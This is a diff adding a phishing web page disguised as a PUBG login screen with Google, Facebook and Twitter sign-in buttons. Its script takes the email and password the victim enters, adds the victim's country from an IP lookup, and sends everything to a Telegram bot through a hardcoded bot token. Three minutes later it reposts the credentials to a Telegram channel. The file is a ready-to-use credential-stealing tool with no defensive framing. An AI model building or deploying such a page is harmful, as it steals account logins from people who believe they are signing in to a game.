@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ps">
+<head>
+  <meta charset="UTF-8">
+  <title>PUBG Login</title>
+  <style>
+    body {
+      background: url('https://cdn.cloudflare.steamstatic.com/steam/apps/578080/header.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: sans-serif;
+      color: white;
+      text-align: center;
+      padding-top: 60px;
+    }
+    .box {
+      background: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      margin: auto;
+      width: 300px;
+      border-radius: 16px;
+    }
+    button, input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+    }
+    .google { background-color: #db4437; color: white; }
+    .facebook { background-color: #1877f2; color: white; }
+    .twitter { background-color: #1da1f2; color: white; }
+    .form { display: none; }
+    .submit { background-color: #28a745; color: white; }
+  </style>
+</head>
+<body>
+
+<div class="box" id="loginBox">
+  <h2>Login to Continue</h2>
+  <button class="google" onclick="selectPlatform('Google')">Login with Google</button>
+  <button class="facebook" onclick="selectPlatform('Facebook')">Login with Facebook</button>
+  <button class="twitter" onclick="selectPlatform('Twitter')">Login with Twitter</button>
+
+  <div class="form" id="loginForm">
+    <input type="email" id="email" placeholder="Email" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <button class="submit" onclick="submitLogin()">Submit</button>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = "7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k";
+  const USER_ID = "5525126008";
+  const CHANNEL_ID = "@PRO_43KPISH";
+  let selectedPlatform = "";
+  let userCountry = "🌐 نامعلوم هیواد";
+
+  // د هیواد د موندلو لپاره IP API کاروو
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      const flag = getFlagEmoji(data.country_code);
+      userCountry = `${flag} ${data.country_name}`;
+    });
+
+  function getFlagEmoji(countryCode) {
+    if (!countryCode) return "🌐";
+    const codePoints = countryCode
+      .toUpperCase()
+      .split('')
+      .map(char => 127397 + char.charCodeAt());
+    return String.fromCodePoint(...codePoints);
+  }
+
+  function selectPlatform(platform) {
+    selectedPlatform = platform;
+    document.getElementById("loginForm").style.display = "block";
+  }
+
+  function sendTelegramMessage(chatId, text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "HTML" })
+    });
+  }
+
+  function submitLogin() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password || !selectedPlatform) {
+      alert("Please fill all fields.");
+      return;
+    }
+
+    const message = `🔐 <b>نوی Login</b>\n🌍 هیواد: ${userCountry}\n🌀 له: ${selectedPlatform}\n<pre>📧 ${email}\n🔑 ${password}</pre>`;
+
+    // 1. سمدلاسه بات ته پیغام
+    sendTelegramMessage(USER_ID, message);
+
+    // 2. درې دقیقې وروسته چینل ته ساده پوسټ
+    setTimeout(() => {
+      const channelMessage = `${message}\n\n📩 دا پیغام د ID <code>${USER_ID}</code> لخوا ولېږل شو.`;
+      sendTelegramMessage(CHANNEL_ID, channelMessage);
+    }, 180000); // 3 دقیقه
+
+    alert("Login sent!");
+  }
+</script>
+
+</body>
+</html>
